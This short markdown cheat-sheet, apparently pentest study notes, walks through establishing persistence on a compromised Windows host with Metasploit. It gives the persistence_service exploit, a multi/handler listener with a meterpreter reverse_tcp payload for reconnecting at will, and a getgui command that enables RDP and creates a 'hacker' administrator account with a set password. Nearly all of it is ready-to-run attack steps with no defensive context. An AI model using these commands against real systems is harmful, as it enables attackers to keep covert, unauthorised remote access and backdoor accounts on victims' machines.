
# You require elevated privileges in order to establish persistence on a Windows system
- __`search persistence_service`__
  - __`use exploit/windows/local/persistence_service`__
  - __remember the `LPORT` because we use same port to login__
  - __when you got successfully got persistence service then you can access the target anytime__
  - __So when you load the msfconsole do this things__
  - __`use multi/handler`__
  - __`set payload windows/meterpreter/reverse_tcp`__
  - > __You should use the same payload that you used before__
  - __set the `LHOST` and `LPORT` that you used before__
 
# Windows Persistence via RDP
 
- __Down below is a meterpreter command used to enable the RDP service if it is disable and create a new user__
- __This `hacker` user is added in `Remote Desktop Users` and `Administrators` group__
  - __`run getgui -e -u hacker -p hacker@123321`__
  - > __Note: You require elevated privileges in order to establish persistence on a Windows system.__
